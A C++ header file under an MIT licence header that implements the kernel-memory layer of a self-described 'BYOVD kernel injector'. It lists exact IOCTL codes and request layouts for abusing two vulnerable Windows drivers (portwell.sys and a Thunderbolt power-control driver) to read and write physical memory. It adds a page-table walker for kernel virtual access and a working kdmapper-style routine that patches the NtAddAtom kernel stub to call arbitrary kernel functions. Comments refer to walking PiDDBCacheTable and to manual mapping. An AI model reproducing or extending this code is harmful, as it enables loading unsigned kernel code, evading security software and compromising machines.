/******************************************************************************
 * The MIT License (MIT)
 *
 * Copyright (c) 2014-2026 Baldur Karlsson
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 ******************************************************************************/

#pragma once

#include <cstdint>
#include <cstddef>
#include <cstring>
#include <type_traits>
#include <QDebug>
#include <QString>

#if defined(Q_OS_WIN)
#include <windows.h>
#endif

// Kernel-mode memory access abstraction used by the BYOVD kernel injector.
//
// The vulnerable drivers used here only expose *physical* memory read/write
// (MmMapIoSpace based), while everything we need to do in kernel (reading
// ntoskrnl exports, walking PiDDBCacheTable, manual mapping) works on kernel
// *virtual* addresses. This class bridges the gap with a 4-level page table
// walker plus the kdmapper-style NtAddAtom stub patch used to call arbitrary
// kernel functions without any code execution primitive.
//
// All protocol constants below were verified by static disassembly of the
// driver binaries (see kernel_mem.cpp for the portwell/TBT request layouts).
// Both backends run a SelfTest() before use so a wrong protocol guess fails
// loudly in the VM instead of corrupting kernel memory.

namespace KernelInjector
{
// Physical read/write request layouts, per driver. Verified by disassembly:
//
// portwell.sys (\\.\PORTWELL_0_1, IOCTL device type 0xEA60):
//   READ  PHYS 0xEA606450: in  {qword phys, dword unit, dword count}
//                           out = count*unit bytes
//   WRITE PHYS 0xEA60A454: in  {qword phys, dword unit, dword count, data...}
//   unit must be 1, 2 or 4 (the driver picks the copy width from it); the
//   byte count is count*unit. Physical addresses are full 64-bit.
//
// TBT_Force_Power_Control_Access64.sys (\\.\TEACCESS, device type 0x22):
//   READ  PHYS 0x2220CC: in  {qword phys, byte unit} (9 bytes)
//                        out = data, size driven by OutputBufferLength
//   WRITE PHYS 0x2220D0: in  {qword phys, byte unit, dword count, data...}
//   ALLOC CONTIG 0x2220C4: in  {dword size, qword highestAddr}
//                          out {qword phys, qword va} (written back to buffer)
//   FREE  CONTIG 0x2220C8: in  {qword va at +8}
//   READ MSR 0x222140: in {dword msr}, out {qword value}
//
// Note: TBT has no VA->PA translation IOCTL (earlier documentation claimed
// 0x2220E0; disassembly shows MmGetPhysicalAddress is only used internally by
// the contiguous allocation handler), so both backends share the page walker.
namespace PortwellProtocol
{
constexpr wchar_t kDevicePath[] = L"\\\\.\\PORTWELL_0_1";
constexpr uint32_t kIoctlReadPhys = 0xEA606450;
constexpr uint32_t kIoctlWritePhys = 0xEA60A454;

#pragma pack(push, 1)
struct PhysRwRequest
{
  uint64_t phys;
  uint32_t unit;
  uint32_t count;
};
#pragma pack(pop)
}    // namespace PortwellProtocol

namespace TbtProtocol
{
constexpr wchar_t kDevicePath[] = L"\\\\.\\TEACCESS";
constexpr uint32_t kIoctlReadPhys = 0x2220CC;
constexpr uint32_t kIoctlWritePhys = 0x2220D0;
constexpr uint32_t kIoctlAllocContiguous = 0x2220C4;
constexpr uint32_t kIoctlFreeContiguous = 0x2220C8;
constexpr uint32_t kIoctlReadMsr = 0x222140;
}    // namespace TbtProtocol

// Buffer granularity for bulk physical reads (e.g. the PML4 scan). This is NOT
// the per-IOCTL size: both drivers map the whole per-IOCTL transfer with one
// unchecked MmMapIoSpace call, so the backends internally chunk requests down
// to kMaxIoChunk (one page) in kernel_mem.cpp.
constexpr size_t kMaxPhysChunk = 1024 * 1024;

class KernelMem
{
public:
  virtual ~KernelMem() {}

  // Backend primitives, implemented by PortwellBackend / TbtBackend.
  virtual bool ReadPhys(uint64_t phys, void *buf, size_t size) = 0;
  virtual bool WritePhys(uint64_t phys, const void *buf, size_t size) = 0;

  // Verifies the backend contract without lasting side effects. Called before
  // any use; a failure means the protocol guess is wrong for this driver.
  virtual bool SelfTest() = 0;

  virtual QString BackendName() const = 0;

  // Shared kernel-virtual address space helpers.
  bool ReadVirtual(uint64_t va, void *buf, size_t size);
  bool WriteVirtual(uint64_t va, const void *buf, size_t size);

  // ntoskrnl.exe base from NtQuerySystemInformation(SystemModuleInformation),
  // resolved in user mode - no kernel access needed for this.
  bool FindNtoskrnlBase();
  uint64_t NtoskrnlBase() const { return m_ntBase; }

  // Resolves an export by name from any kernel module (kernel R/W based).
  uint64_t FindModuleExport(uint64_t moduleBase, const char *name);

  // Resolves an ntoskrnl.exe export by name.
  uint64_t FindExport(const char *name) { return FindModuleExport(m_ntBase, name); }

  // kdmapper's CallKernelFunction: temporarily patches the kernel NtAddAtom
  // stub to jump to kernel_function_address, calls it from user mode via
  // ntdll!NtAddAtom, then restores the stub. Up to 4 arguments.

  // Return-type dispatch without C++17 if constexpr (this project builds as
  // C++14). For T=void the out parameter is a void* and the generic template
  // is SFINAE-removed (can't assign to *out), so the void* overload runs; for
  // other T the generic template is an exact match and wins.
  template <typename Fn, typename Out, typename... A>
  static auto InvokeAndStore(Fn fn, Out *out, A... args) -> decltype(*out = fn(args...), void())
  {
    *out = fn(args...);
  }
  template <typename Fn, typename... A> static void InvokeAndStore(Fn fn, void *, A... args)
  {
    fn(args...);
  }

  template <typename T, typename... A> bool CallKernelFunction(T *out_result, uint64_t kernel_function_address, const A... arguments)
  {
    static_assert(sizeof...(A) <= 4, "CallKernelFunction supports at most 4 arguments");

    constexpr bool call_void = std::is_same<T, void>::value;

    if(!call_void && out_result == nullptr)
      return false;
    if(kernel_function_address == 0)
      return false;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if(ntdll == nullptr)
      return false;

    // NtAddAtom is a tiny syscall stub, ideal as a temporary jump trampoline.
    void *userNtAddAtom = (void *)GetProcAddress(ntdll, "NtAddAtom");
    if(userNtAddAtom == nullptr)
      return false;

    uint64_t kernelNtAddAtom = FindExport("NtAddAtom");
    if(kernelNtAddAtom == 0)
      return false;

    uint8_t trampoline[12] = {0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0};
    memcpy(&trampoline[2], &kernel_function_address, sizeof(uint64_t));

    uint8_t original[sizeof(trampoline)];
    if(!ReadVirtual(kernelNtAddAtom, original, sizeof(original)))
      return false;

    // Guard against a leftover patch from a crashed previous run.
    if(memcmp(original, trampoline, sizeof(trampoline)) == 0)
    {
      qWarning() << "KernelInjector: NtAddAtom stub already patched, refusing to run";
      return false;
    }

    if(!WriteVirtual(kernelNtAddAtom, trampoline, sizeof(trampoline)))
      return false;

    const auto Function = reinterpret_cast<T(__stdcall *)(A...)>(userNtAddAtom);

    InvokeAndStore(Function, out_result, arguments...);

    // Restore the stub. If this fails the machine is left with a live
    // trampoline - surface the failure so the caller can refuse to continue.
    if(!WriteVirtual(kernelNtAddAtom, original, sizeof(original)))
    {
      qWarning() << "KernelInjector: failed to restore NtAddAtom stub";
      return false;
    }

    return true;
  }

protected:
  // 4-level page table walk for a kernel virtual address (shared by both
  // backends). The PML4 physical address is discovered by scanning physical
  // memory for a self-referencing page table and verified by translating a
  // known address before it is trusted.
  bool VirtualToPhysical(uint64_t va, uint64_t *phys);
  bool EnsurePageTable();

  uint64_t m_ntBase = 0;
  uint64_t m_pml4Phys = 0;

  // Caches the physical addresses of the last walked page table levels so
  // sequential VA walks (e.g. reading a whole section) cost one physical read
  // per level change instead of four. Each level is keyed by its table
  // *index* (va >> N). A key built by masking the index bits out of the VA
  // instead would make two VAs that differ only in those bits (e.g. exactly
  // 1GB or 2MB apart) collide and silently reuse another region's table
  // address - translating to a wrong physical page.
  struct WalkCache
  {
    uint64_t pdKey = 0;    // va >> 30 : 1GB region -> page directory phys
    uint64_t pdPhys = 0;
    uint64_t ptKey = 0;    // va >> 21 : 2MB region -> page table phys
    uint64_t ptPhys = 0;
    uint64_t pageKey = 0;  // va >> 12 : 4KB page -> physical page
    uint64_t pagePhys = 0;
  } m_walkCache;
};

// Backends. Each opens the driver device on construction and closes on
// destruction; the driver must already be loaded by DriverLoader.
class PortwellBackend : public KernelMem
{
public:
  explicit PortwellBackend(void *deviceHandle);
  ~PortwellBackend();

  bool ReadPhys(uint64_t phys, void *buf, size_t size) override;
  bool WritePhys(uint64_t phys, const void *buf, size_t size) override;
  bool SelfTest() override;
  QString BackendName() const override { return QStringLiteral("portwell"); }

private:
  void *m_device = nullptr;
};

class TbtBackend : public KernelMem
{
public:
  explicit TbtBackend(void *deviceHandle);
  ~TbtBackend();

  bool ReadPhys(uint64_t phys, void *buf, size_t size) override;
  bool WritePhys(uint64_t phys, const void *buf, size_t size) override;
  bool SelfTest() override;
  QString BackendName() const override { return QStringLiteral("tbt"); }

  // Contiguous physical allocation. Only used by the TBT backend's SelfTest
  // (write round-trip scratch page) - the manual mapper allocates via
  // MmAllocateIndependentPagesEx for both backends, and portwell has no
  // allocation primitive at all.
  bool AllocContiguous(uint32_t size, uint64_t highestAddr, uint64_t *outPhys, uint64_t *outVa);
  bool FreeContiguous(uint64_t va);

private:
  void *m_device = nullptr;
};
}    // namespace KernelInjector
